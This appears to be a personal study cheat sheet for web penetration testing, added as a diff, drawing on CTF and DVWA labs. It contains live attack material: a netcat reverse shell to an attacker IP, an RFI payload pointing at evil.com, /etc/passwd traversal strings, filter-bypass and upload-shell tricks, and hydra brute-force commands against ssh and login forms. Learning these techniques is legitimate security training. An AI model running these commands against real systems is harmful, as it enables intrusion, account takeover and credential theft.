@@ -1,0 +1,535 @@
+-------------------
+Attacking strategies:
+-------------------
+https://lab.pentestit.ru/docs/TL8_WU_en.pdf CTF:
+1)information in HTML source
+2)hidden directories
+3)input places for injections
+4)file upload
+
+OWASP Testing guide:
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf
+
+---------------
+Virtual Machine
+---------------
+Connecting to the VM:
+Edit /etc/interfaces to make the ip static. Make the ip be in the same range as the adapter and set the gateway to the adapter
+sudo nano /etc/network/interfaces
+iface eth0 inet static
+address 192.168.56.20
+netmask 255.255.255.0
+gateway 192.168.56.1
+sudo ifdown eth0
+sudo ifup eth0
+
+----------------
+Fingerprinting
+----------------
+Get to know what kind of technologies the server uses
+
+[+] Get header info
+For HTTP headers:
+netcat [ip or domain] [port]
+GET / HTTP/1.1
+Host: [ip or domain]
+
+For HTTPS headers:
+openssl s_client -connect [ip or domain]:443
+GET / HTTP/1.1
+Host: [ip or domain]
+
+If requests don't come back like they do in the browser (e.g 403 instead of 404), there is probs a WAF (web application
+firewall) installed. In that case, mimic the browser and send a user-agent string in Zap's bruteforce)
+
+[+] Use Wappalyzer to identify known technologies.
+
+[+] Confirm use of PHP:
+All of these (along with solutions) can be found here, in the comments section: http://php.net/manual/en/security.hiding.php
+
+If expose_php hasn't been set to off in the Apache conf file (which also hides .php extensions), then put this as 
+an argument to get php info: ?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
+
+The PHP session ID cookie's name defaults to "PHPSESSIONID".
+
+The website might have "X-powered by PHP" in a HTTP response header.
+
+---------------
+Enumeration:
+---------------
+Find potentially vulnerable folders or files that disclose information:
+This is useful because hidden files may not be hardened against attacks, they may be backups that are either
+old and therefore vulnerable or give away source code (browsing files like mypage.php.backup will display the code in HTML)
+Also log files may contain sensitive data.
+
+[+] Inspect known HTTP headers and check for vulns (like outdated software, 
+remote file inclusion, etc).
+
+nikto -h [domain or ip]
+
+[+] Directory scans: brute force directories/files (using wfuzz)
+python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vulnerable/FUZZ
+for a time delay, do -s
+
+Identify the file extensions in use within known areas of the
+application   (e.g.   jsp,   aspx,   html),   and   use   a   basic   wordlist   
+appended with each of these extensions (or use a longer list of 
+common extensions if resources permit).
+
+(!)For each file identified through other enumeration techniques, 
+create  a  custom  wordlist  derived  from  that  filename.  Get  a  list  
+of common file extensions (including zip, ~ (created by emacs), (none at all), bak, txt, src, dev, old, inc, 
+orig,  copy,  tmp,  etc.)  and  use  each  extension  before,  after,  and  
+instead of, the extension of the actual file name.
+
+Note:  Windows  file  copying  operations  generate  file  names  pre-
+fixed with “Copy of “ or localized versions of this string
+
+[+] Try to infer the name of the file based on the naming scheme.
+For example,  if  a  page  viewuser.asp  is  found,  then  look  also  for  edituser.
+asp, adduser.asp and deleteuser.asp. If a directory /app/user is found, 
+then look also for /app/admin and /app/manager.
+
+[+] Read the comments that devs leave. They may contain useful info.
+
+[+] Look at robots.txt. Might contain interesting pages.
+
+[+] Check for directory listing. This is turned on by default. www.site.com/directory/ will give you a directory listing.
+
+[+] Old files (which haven't been deleted but are no longer in use) may be in Google's archives.
+Refer to OWASP testing guide v4's "Google Hacking" are for more info.
+
+[+] If server uses some software (for example forum software phpbb), then check to see if the 
+dev has accidentally left some installation files there. Those could prove to be useful.
+For example, for phpbb, that might be /phpbb3/install/install.php 
+
+[+]If you find a .git directory, then check this out: https://lab.pentestit.ru/docs/TL8_WU_en.pdf
+
+[+] Joomla: Check out joomscan https://www.owasp.org/index.php/OWASP_Joomla_Vulnerability_Scanner_Usage
+	 Wordpress: wpscan
+--------------------------------------------------------
+Attacking web login applications/authentication methods
+--------------------------------------------------------
+[+] HTTP verb tampering:
+Any HTTP method based authentication (like basic authentication or digest authentication), this should be tested. 
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf
+http://cdn2.hubspot.net/hub/315719/file-1344244110-pdf/download-files/Bypassing_VBAAC_with_HTTP_Verb_Tampering.pdf?t=1464196641458
+This works on ASP.net and Java EE where the dev has said 
+"Allow GET requests for admin, deny GET and POST requests for everyone else"
+What he's forgotten is that while GET and POST are denied, everything else is allowed. 
+Where there's method-based authentication, this should be tried.
+
+Also make sure nonexistent ones like JEFF are denied.
+
+[+] PHP loose comparisons (check below)
+
+[+] Bruteforcing (check below)
+
+[+] Session fixation: refer to hacksplaining
+----------------------------------------
+Bruteforcing passwords/Password cracking
+----------------------------------------
+[+] Password cracking guide:
+(This applies most to offline cracking)
+
+(+) If there are no word mangling rules (need number, uppercase, symbol, etc), then most people don't
+like to mangle passwords. About 51% don't use numbers and only 6% use uppercase.
+
+Dictionary attacks with a lot of different words and not a lot of mangling work well here for
+catching low-hanging fruit. In this blog there are all the words in wikipedia - blog.sebastien.raveau.name
+
+(+) If here is a password creation policy, then you do have to use a smaller input dictionary and more mangling.
+The best such input dictionaries are based on previously cracked passwords.
+
+(+) The default mangling rules in John the Ripper work pretty well. However, they're designed 
+to crack weak passwords. Also, you can make your own rules, apply that to a wordlist and conti-
+nually feed it to John using the -stdin option
+
+(+) Probabilistic cracking:
+Some words are more common than others: password, monkey, football
+Some word mangling rules are more common: 123, 007, $$$
+
+Probabilistic cracker assigns probabilities to everything:
+dictionary word commonness,
+word mangling rules
+l33tspeak
+
+These probabilities are created by a "training list"
+
+If you need to attack a stronger set of passwords, you just create a stronger training list.
+(This should be posted on this guy's site: reusablesec.blogspot.com)
+
+
+(+) If all the passwords have individual salts, then "password" and "password" don't have the same 
+hash for different users, which is lame. 
+In that case, you can't crack all the hashes by just doing one round of cracking. You have to
+do a round of cracking for every single hash, which is lame. In that case, just grab a wordlist
+with previously cracked passwords and try those (since ppl reuse passwords)
+
+(+) For attacking an individual, and not a huge list, you just have to create additional
+wordlists and attack a high probability to words related to them: kids' names, pets' names, 
+parents, hobbies, etc. You can probably try passwords with high complexity and word mangling
+(mby even bruteforce), depending on how much time you have (especially if you're just attacking admin)
+
+(+) When bruteforcing, you should do letter frequency analysis
+With that, you can figure out that some letters like "q" don't occur very much and you shouldn't try them
+
+Also note that numbers are usually at the end and uppercase at the beginning (you can use crunch for this)
+
+Markov models - figures out "human-like" words.
+Basically says that "if you have the letter 'q', then the letter that follows it is almost alwaus 'u'"
+This is built into John the Ripper
+The result is that most of the things you get are words that look like they're taken from 
+a dictionary (like "dog"). But also, you get words like "stech", which seems like it could be a password.
+[+] Bruteforce HTTP Basic Auth (the popup screen)
+hydra -L users.lst -P passwords.txt -f www.site.org http-head /path/of/target/ -V
+-V is verbose mode,  -f is exit after first login pair found
+ 
+[+] Brute forcing http GET form:
+http://www.sillychicken.co.nz/2011/05/how-to-brute-force-htt-forms-in-windows/
+
+[+] The following is based on this:
+http://insidetrust.blogspot.com.ee/2011/08/using-hydra-to-dictionary-attack-web.html
+
+Bruteforcing ssh
+hydra <IP address or domain> ssh -s 22 -P passwords.txt -L users.txt (or -l user) -e nsr -t 4 (e.g 4 threads)
+
+Bruteforcing HTTP POST form:
+hydra <IP address or domain> http-form-post "<login path, e.g /login.php>:<form username input, e.g username>=^USER^&<form password input>=^PASS^:<The failed login text, e.g Wrong login>" -l <username> -P <passwordlist, e.g 500-worst-passwords.txt> -t 10 (number of threads, I don't know why 10)
+
+[+] If you want to crack PHP's md5, then the correct format is raw_md5, not any other md5 variant.
+
+----------------------
+Clickjacking
+--------------------
+Refer to the hacksplaining.com lesson about it. 
+
+----------
+SQLi
+--------
+Make sure the number of columns in the UNION  request matches the amount before the UNION. 
+You can do this with UNION SELECT 1, 2, 3, 4, etc. until you stop getting an error
+
+What select 1 does is it gives you the first column, but replaces all values with ones. The formal name of the column remains the 
+same though (so if you do mysql_fetch_array(sqlquery)['id'] (and id is the first row), and the sqlquery is SELECT 1, 
+then it will give you 1. If you do SELECT 1, 2 and id is the second row, you get 2.
+
+When you want to comment something out, you need "-- " at the end. MIND THE SPACE.
+The problem with browsers is that even if you put that space at the end, it will take it off. Use %20 at the end instead.
+
+To get table and column info, type 
+SELECT concat(table_name,':', column_name) FROM information_schema.columns
+
+[+] SQLmap tutorial - http://www.binarytides.com/sqlmap-hacking-tutorial/
+frst thing to try - sqlmap -u "mysite.com/sql.php?param=1"
+---------------
+File upload vulns
+---------------
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf
+this covers spoofing content-type, bypassing imagesize() and filetype checks.
+
+[+] May be found: when you upload photos as your avatar, when you upload files for other ppl to see
+[+] If you aren't allowed to upload .php, try uploading .php3 or .php.test (since Apache doesn't have handler for that, it will be used as .php)
+If the dev checks filetype by doing split(), then shell.jpg.php will work
+[+] To change MIME type (NOT the same as getimagesize()), use burpsuite.
+To bypass getimagesize(), send a valid image with php in its comments
+[+] .htaccess is awesome (nginx doesn't support .htaccess files, only Apache). Can turn .jpg into .php or even the htaccess itself into .php.
+
+[+] The solution is to prevent the users from accessing those files directly by putting them
+outside the webroot and also by obfuscating the name, so that it's very difficult to get it 
+by using LFI. Also prevent all the types of tricks mentioned in the article.
+-------------------------------------------------------
+RCE/Code injection/Command execution/Command Injection:
+-------------------------------------------------------
+[+] Use burp. It's so useful! For example, in one challenge, the programmer did a header("someotherlocation") when he detected that the formatting
+wasn't right. But he forgot to put return afterwards. So you could see the response come back in burp and see the results of your command injection.
+
+[+] if you can provide parameters to shell_exec() or exec() or passthru(), then you have a number of options.
+
+Look at the list of bash redirection and command operators:
+http://unix.stackexchange.com/questions/159513/what-are-the-shells-control-and-redirection-operators
+Redirect stderr to stdout:
+2>&1
+use ; or && or & to do multiple commands (you should encode these, especially the &).
+
+There's also notation for putting commands inside other commands.
+The following are equal to ping 127.0.0.1:
+ping `echo 127.0.0.1`
+ping $(echo 127.0.0.1)
+This allows you to execute random commands
+
+If you know what command they're using inside exec(), make sure to experiment with edge cases on the command line.
+For example:
+exec(ping blah 127.0.0.1);  //is equal to
+exec(ping 127.0.0.1);
+So you can put anything instead of blah (like another command) and nothing bad will happen to you.
+
+Also you can check for typos. So if $shitdev puts "| " into the blacklist, 
+then injecting "| ls" will get blacklisted, but "|ls" won't.  Also he might've blacklisted ' instead of `, you never know.
+
+filters will probably be doing a preg_match on the string.
+
+It might be possible to do a multi-line command. 
+For this, put an encoded newline (%0a) and your command after the initial command.
+
+-------------------------------------------------------
+Remote/Local File Inclusion/RFI/LFI/Directory Traversal
+-------------------------------------------------------
+[+] LFI often happens  in multi-language websites. It gets the $language from either the cookie or
+the GET request and then includes language/$lang.php.
+
+[+] Log files, cookies and other methods can be used to achieve LFI (and RCE):
+https://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution
+
+[+] Putting a null-byte in between a string *might* make the string stop in some commands, for example in includes (because that's how it works in C). 
+For example, include("shell.php\0.img") and will try to include "shell.php". 
+Doesn't work since PHP 5.3.4 (preg_ functions should still be vulnerable)
+If you try to do it after PHP 5.3.4, then it simply won't open anything with a null byte in it (even if you put the byte after the correct filename)
+
+[+] Remote file inclusion - how to pass any extension or suffix to the URL (like "google.com/.php") without errors:
+You can try to include Google's homepage by using the accessing URL: http://vulnerable/index.php?page=http://www.google.com/?
+The ? at the end of the URL is used to ensure any extension or suffix added to the URL will be interpreted by Google's servers as a parameter. If the configuration of the vulnerable system doesn't allow remote file include, an error message is displayed.
+
+[+] Exploitation of RFI - how to make it so that the PHP code is passed to the vulnerable system, 
+not the result of visiting the .php site:
+https://pentesterlab.com/exercises/php_include_and_post_exploitation/course
+Under "exploitation of remote file include"
+
+From DVWA:
+Low - ?page=http://evil.com
+Medium - use some other filestream, like php://. Info at https://secure.php.net/manual/en/wrappers.php
+
+
+[+] Local file inclusion:
+
+[+]View source code of php using filters (encrypt to base64)
+Info at https://secure.php.net/manual/en/wrappers.php
+
+from DVWA:
+Low - ../../../../../../../../etc/passwd (on windows you'd do ..\)
+Medium - ../ is filtered, but only once. Meaning, ....//, after filtering, becomes ../
+High - Dev allows only certain files to be included, like file1, file2, file3. He did it by comparing the filename with "file*".
+Meaning, file1/../file1.php returns file1.php.
+
+[+] Methods of getting PHP on the server for LFI:
+    inject the PHP code in the log: for example with a web server, by accessing a crafted URL (the path contains the PHP code), and including the web server log.
+    inject the PHP code in an email, by sending an email and including the email (in `/var/spool/mail).
+    upload a file and including it, you can for example upload an image and put your PHP code in the image's comment section (so it won't get modify if the image is resized).
+    upload the PHP code via another service: FTP, NFS, ...
+    
+[+] Anti filetype checking methods:
+Check what extension and what content can be uploaded.
+	Try to upload PHP file with the extension changed to the correct one (bypasses extension)
+	Try to upload a file in the correct format with the extension changed to .php (bypasses content)
+	If both enabled, do either;
+		add PHP payload to a PDF file
+		create PHP file that looks like PDF and bypasses the content-type check (much safer)
+		(there are also kali linux programs that do this)
+			https://pentesterlab.com/exercises/php_include_and_post_exploitation/course
+			Under "exploitation of local file include"
+
+[+] Including PHP files as base64 so you can read them:
+https://secure.php.net/manual/en/wrappers.php.php
+php://filter/convert.base64-encode/resource=index
+Example: http://127.0.0.1/fileinclude.php?lang=php://filter/convert.base64-encode/resource=hello.php
+data://text/plain;base64 (this probably isn't useful)
+
+[+] Directory traversal - try putting the folder name in there instead of the filename. I wonder what
+will happen.
+---------------
+Post exploitation
+----------------
+[+] Create shell with netcat:
+
+Attacker$ sudo nc -l -p 80
+the attacker listens to port 80
+
+Victim$ nc [attacker IP] 80 -e /bin/bash
+The -e sign says to start up the program after connection and deliver the commands there
+Not all versions of netcat have -e.
+
+$ command-name 2>&1
+Redirect error messages to stdout instead of stderr (so you can see the errors)
+
+
+[+] Create "true" shell with socat:
+Presumes a previous shell on port 80 with the netcat shell.
+https://pentesterlab.com/exercises/php_include_and_post_exploitation/course
+
+--------------------
+Linux host reviewing
+--------------------
+*I'll put only offensive things here. For defensive ones (logging, etc), go to https://pentesterlab.com/exercises/linux_host_review/course
+*If there's lots of info, use "| less" to view it one by one.
+
+[+] Get Kernel info:
+
+uname -a 
+gives kernel info
+
+uptime 
+can be used to estimate how long it's been since the system's been patched.
+
+[+] Check for vulns:
+
+dpkg -l | less
+List all installed programs
+
+go to cvedetails and see if there are any unpatched programs to exploit (probably have to judge by uptime, unless it's been even longer since it was updated?)
+
+[+] Get general info:
+
+ifconfig -a
+to see what network interfaces are present;
+
+route -n
+to get the system routes. If the system does not have the route command installed, netstat -rn can be a suitable substitute.
+
+cat /etc/resolv.conf and cat /etc/hosts
+to know more about the DNS configuration of the system.
+
+[+] firewall rules:
+iptables -L -v
+ip6tables -L -v
+
+[+] Check file privileges (/etc/shadow should be with root privileges)
+ls -l /etc/ | less (gives it for all the files in the directory, so just find the right one)
+do this with /etc/shadow, /etc/shadow.backup, /etc/mysql/my.cnf, Apache SSL private keys
+
+[+] setuid files
+These are files which run with the owner's privileges instead of the user's. 
+If the owner is root, they can be a security problem. The "passwd" utility is one such setuid file.
+
+find / -perm -4000 -ls
+Retrieves list of setuid files.
+For each file found, check if it's legitimate and if permissions are set correctly.
+
+[+] Find files that can be read from/written to.
+*You'll probably want to filter out /proc/ answers by doing "| grep -v /proc"
+
+Using find, you can retrieve a list of files that are readable and write-able by any users using the following command:
+# find / -type f -perm -006  2>/dev/null
+
+and a list of files write-able by any users using:
+find / -type f -perm -002  2>/dev/null
+
+[+] UID 0 users
+A common misconfiguration/backdoor of the /etc/passwd is to have a user with the uid 0. On traditional systems, only root is supposed to have the uid 0. If another user has the uid 0, he's basically root on the system.
+
+[+] /etc/shadow hash:
+You can check what encryption is used by checking the hash format, if the hash:
+    does not have a $ sign, DES is used;
+    starts by $1$, MD5 is used;
+    starts by $2$ or $2a$, Blowfish is used;
+    starts by $5$, SHA-256 is used;
+    starts by $6$, SHA-512 is used.
+
+This can also be used 
+cat /etc/pam.d/common-password
+
+[+] sudoers
+The sudo configuration is stored in /etc/sudoers:
+
+# egrep -v '^#|^$'  /etc/sudoers
+Defaults  env_reset
+root  ALL=(ALL) ALL
+%sudo ALL=(ALL) ALL
+user  ALL=(ALL) NOPASSWD: ALL
+
+We can see there that the user named user can be any users (including root) without any passwords and without restriction.
+
+A common mistake with sudo is to provide a user with a limited set of commands that will still allow him to get a root shell on the system. For example, a user with access to /bin/chown (change owner) and /bin/chmod (change mode) will be able to copy a shell in his home and change the shell owner to root and add the setuid bit on the file. This way, this user will be able to have a root shell on the system.
+
+[+] Services:
+
+ps -edf 
+Running services
+
+# lsof -i UDP -n -P
+UDP services
+
+# lsof -i TCP -n -P
+TCP services
+
+--------------------------------
+CSRF/Cross Site Request Forgery
+--------------------------------
+[+] Ways to do PUT/GET request without victim input:
+
+POST:
+make POST form with hidden inputs and use JavaScript to send the POST request
+
+GET:
+Make image with zero width and length and src=The_CSRF_Link. The GET request is made automatically.
+
+PUT/DELETE:
+This one is very difficult. Can only be accomplished with like browser plugins/plugin vulns and stuff.
+
+[+] If referrer header is checked, then two options:
+1)If site.com/csrf checks that "site.com" is in the string, you can send the query from  
+malicious.com/site.com or
+site.com.malicious.com
+2)Use XSS (like reflected XSS) to achieve the goal.
+
+[+] If an anti-CSRF token is added, you need XSS.
+
+------------------------------------------------
+HTTP Request Smuggling/HRF/Web Cache Poisoning
+------------------------------------------------
+OWASP: https://www.owasp.org/index.php/Cache_Poisoning
+Do root-me challenge to learn this.
+
+---------------------------------
+Global register poisoning
+---------------------------------
+http://repository.root-me.org/Programmation/PHP/EN%20-%20Using%20register%20globals%20in%20PHP.pdf
+[+] Turned off by default since PHP 4.2.0 and deprecated since PHP 5.3.0!
+With this, you can initialize any uninitialized variables using get requests. 
+It's good to have source code available with this.
+
+Example:
+<?php
+	if (1==2) {
+		$maths = False;
+	}
+	if ($maths) {
+		loginToWebpage()
+	}
+?>
+
+You can do vulnerable/registerpoison.php?maths=1 (because 1 == True) and get logged into the webpage.
+
+--------------------------------------
+PHP loose comparisons/Type juggling
+--------------------------------------
+(check the link for all the examples)
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf
+Can be used for CSRF token bypass, for authentication bypass
+	
+[+] PHP has loose comparisons ("==") and strict comparisons ("===")
+
+Loose comparisons has some weird conversion rules.
+
+JSON is really useful because you can also send ints and bools and stuff, not just strings.
+
+Importantly, any string which has a letter or "0whatever" in the beginning is equal to int(0). If it begins with "123whatever", it's equal to int(123)
+Also TRUE == "whatever" will also always return true.
+
+JSON:
+{"username":0}
+if (0 == "testusername") { //works also with (123 == "123testusername")
+		echo "username bypassed";
+}
+
+[+] Also, with strcmp, if they've made a check with if(!strcmp($var1, $var2)) then they've fucked up,
+
+Use this to determine what counts as TRUE and what counts as false.
+http://php.net/manual/en/language.types.boolean.php
+
+JSON:
+{"password":[]}
+
+if (!strcmp([], "testpassword")) {
+	echo "password bypassed";
+}
+	
